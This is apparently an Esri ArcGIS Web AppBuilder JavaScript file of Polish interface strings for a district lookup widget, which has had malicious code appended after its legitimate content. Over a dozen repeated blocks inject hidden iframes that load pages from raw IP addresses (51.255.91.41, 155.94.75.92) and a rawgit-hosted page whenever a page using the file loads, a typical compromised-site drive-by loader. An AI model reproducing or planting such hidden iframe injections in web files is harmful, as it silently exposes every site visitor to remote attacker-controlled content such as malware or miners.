// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/DistrictLookup/setting/nls/strings":{units:{miles:"Mile",kilometers:"Kilometry",feet:"Stopy",meters:"Metry"},layerSetting:{layerSettingTabTitle:"Ustawienia wyszukiwania",buttonSet:"Ustaw",selectLayersLabel:"Zaznacz warstw\u0119",selectLayersHintText:"Wskaz\u00f3wka: s\u0142u\u017cy do wybierania warstwy poligonowej i powi\u0105zanej z ni\u0105 warstwy punktowej.",selectPrecinctSymbolLabel:"Wybierz symbol, aby wyr\u00f3\u017cni\u0107 poligon",selectGraphicLocationSymbol:"Adres lub symbol lokalizacji",
graphicLocationSymbolHintText:"Wskaz\u00f3wka: symbol wyszukiwanego adresu lub klikni\u0119ta lokalizacja",precinctSymbolHintText:"Wskaz\u00f3wka: s\u0142u\u017cy do wy\u015bwietlania symbolu dla wybranego poligonu",selectColorForPoint:"Wybierz kolor w celu wyr\u00f3\u017cnienia punktu",selectColorForPointHintText:"Wskaz\u00f3wka: s\u0142u\u017cy do wy\u015bwietlania koloru wyr\u00f3\u017cnienia dla wybranego punktu"},searchSourceSetting:{searchSourceSettingTabTitle:"Ustawienia \u017ar\u00f3d\u0142a wyszukiwania",
searchSourceSettingTitle:"Ustawienia \u017ar\u00f3d\u0142a wyszukiwania",searchSourceSettingTitleHintText:"Dodaj i skonfiguruj us\u0142ugi geokodowania lub warstwy obiekt\u00f3w jako \u017ar\u00f3d\u0142a wyszukiwania. \u0179r\u00f3d\u0142a te okre\u015blaj\u0105, co mo\u017cna wyszukiwa\u0107 w oknie wyszukiwania.",addSearchSourceLabel:"Dodaj \u017ar\u00f3d\u0142o wyszukiwania",featureLayerLabel:"Warstwa obiekt\u00f3w",geocoderLabel:"Geokoder",nameTitle:"Nazwa",generalSettingLabel:"Ustawienia og\u00f3lne",
allPlaceholderLabel:"Tekst zast\u0119pczy dla wyszukiwania wszystkich:",allPlaceholderHintText:"Wskaz\u00f3wka: wprowad\u017a tekst zast\u0119pczy wy\u015bwietlany podczas przeszukiwania wszystkich warstw i geokodera",generalSettingCheckboxLabel:"Wy\u015bwietl odr\u0119bne okno ze znalezionym elementem: obiektem lub miejscem",countryCode:"Kod kraju lub regionu",countryCodeEg:"np. ",countryCodeHint:"Pozostawienie pustego pola uruchomi wyszukiwanie we wszystkich krajach i regionach",questionMark:"?",
searchInCurrentMapExtent:"Wyszukaj tylko w bie\u017c\u0105cym zasi\u0119gu mapy",zoomScale:"Skala powi\u0119kszenia",locatorUrl:"Adres URL geokodera",locatorName:"Nazwa geokodera",locatorExample:"Przyk\u0142ad",locatorWarning:"Ta wersja us\u0142ugi geokodowania nie jest obs\u0142ugiwana. Wid\u017cet obs\u0142uguje us\u0142ug\u0119 geokodowania w wersji 10.0 i nowszych.",locatorTips:"Sugestie s\u0105 niedost\u0119pne poniewa\u017c us\u0142uga geokodowania nie obs\u0142uguje funkcji sugestii.",layerSource:"\u0179r\u00f3d\u0142o warstwy",
setLayerSource:"Skonfiguruj \u017ar\u00f3d\u0142o warstwy",setGeocoderURL:"Skonfiguruj adres URL geokodera",searchLayerTips:"Sugestie s\u0105 niedost\u0119pne poniewa\u017c us\u0142uga obiektowa nie obs\u0142uguje funkcji paginacji.",placeholder:"Tekst zast\u0119pczy",searchFields:"Pola wyszukiwania",displayField:"Pole wy\u015bwietlania",exactMatch:"Dok\u0142adne dopasowanie",maxSuggestions:"Maksymalna liczba sugestii",maxResults:"Wyniki maksymalne",enableLocalSearch:"W\u0142\u0105cz wyszukiwanie lokalne",
minScale:"Skala min.",minScaleHint:"Kiedy skala mapy b\u0119dzie wi\u0119ksza ni\u017c ta skala, zostanie zastosowane wyszukiwanie lokalne",radius:"Promie\u0144",radiusHint:"Okre\u015bla promie\u0144 obszaru wok\u00f3\u0142 bie\u017c\u0105cego centrum mapy u\u017cywanego do przyspieszenia oceny propozycji geokodowania, aby propozycje znajduj\u0105ce si\u0119 najbli\u017cej lokalizacji by\u0142y zwracane jako pierwsze",meters:"Metry",setSearchFields:"Skonfiguruj pola wyszukiwania",set:"Ustaw",fieldName:"Nazwa",
invalidUrlTip:"Adres URL ${URL} jest nieprawid\u0142owy lub nieosi\u0105galny.",invalidSearchSources:"Nieprawid\u0142owe ustawienia \u017ar\u00f3d\u0142a wyszukiwania"},layerSelector:{selectPolygonLayerLabel:"Wybierz warstw\u0119 poligonow\u0105",selectPolygonLayerHintText:"Wskaz\u00f3wka: s\u0142u\u017cy do wyboru warstwy poligonowej.",selectRelatedPointLayerLabel:"Wybierz warstw\u0119 punktow\u0105 powi\u0105zan\u0105 z warstw\u0105 poligonow\u0105",selectRelatedPointLayerHintText:"Wskaz\u00f3wka: s\u0142u\u017cy do wyboru warstwy punktowej powi\u0105zanej z warstw\u0105 poligonow\u0105",
polygonLayerNotHavingRelatedLayer:"Wybierz warstw\u0119 poligonow\u0105, kt\u00f3ra ma powi\u0105zan\u0105 warstw\u0119 punktow\u0105.",errorInSelectingPolygonLayer:"Wybierz warstw\u0119 poligonow\u0105, kt\u00f3ra ma powi\u0105zan\u0105 warstw\u0119 punktow\u0105.",errorInSelectingRelatedLayer:"Wybierz warstw\u0119 punktow\u0105 powi\u0105zan\u0105 z warstw\u0105 poligonow\u0105"},routeSetting:{routeSettingTabTitle:"Ustawienia wskaz\u00f3wek dojazdu",routeServiceUrl:"Us\u0142uga wyznaczania trasy",
buttonSet:"Ustaw",routeServiceUrlHintText:"Wskaz\u00f3wka: kliknij przycisk Set (Ustaw), aby wybra\u0107 us\u0142ug\u0119 wyznaczania trasy dla us\u0142ugi sieciowej",directionLengthUnit:"Jednostki d\u0142ugo\u015bci u\u017cywane wskaz\u00f3wek dojazdu",unitsForRouteHintText:"Wskaz\u00f3wka: s\u0142u\u017cy do wy\u015bwietlania raportowanych jednostek u\u017cywanych dla trasy",selectRouteSymbol:"Wybierz symbol, aby wy\u015bwietli\u0107 tras\u0119",routeSymbolHintText:"Wskaz\u00f3wka: s\u0142u\u017cy do wy\u015bwietlania symbolu liniowego trasy",
routingDisabledMsg:"Aby w\u0142\u0105czy\u0107 wskaz\u00f3wki dojazdu, w\u0142\u0105cz trasowanie (routing) w elemencie us\u0142ugi ArcGIS Online."},networkServiceChooser:{arcgislabel:"Dodaj z us\u0142ugi ArcGIS Online",serviceURLabel:"Dodaj adres URL us\u0142ugi",routeURL:"Adres URL trasy",validateRouteURL:"Sprawd\u017a poprawno\u015b\u0107",exampleText:"Przyk\u0142ad",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",
invalidRouteServiceURL:"Podaj prawid\u0142ow\u0105 us\u0142ug\u0119 wyznaczania tras.",rateLimitExceeded:"Przekroczono limit szybko\u015bci. Spr\u00f3buj ponownie p\u00f3\u017aniej.",errorInvokingService:"Nazwa u\u017cytkownika lub has\u0142o jest nieprawid\u0142owe."},symbolPickerPreviewText:"Zobacz podgl\u0105d:",showToolToSelectLabel:"Ustaw przycisk lokalizacji",showToolToSelectHintText:"Wskaz\u00f3wka: umo\u017cliwia podanie przycisku umo\u017cliwiaj\u0105cego ustawienie lokalizacji na mapie. Dzi\u0119ki niemu nie trzeba ustawia\u0107 lokalizacji po ka\u017cdym klikni\u0119ciu mapy",
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});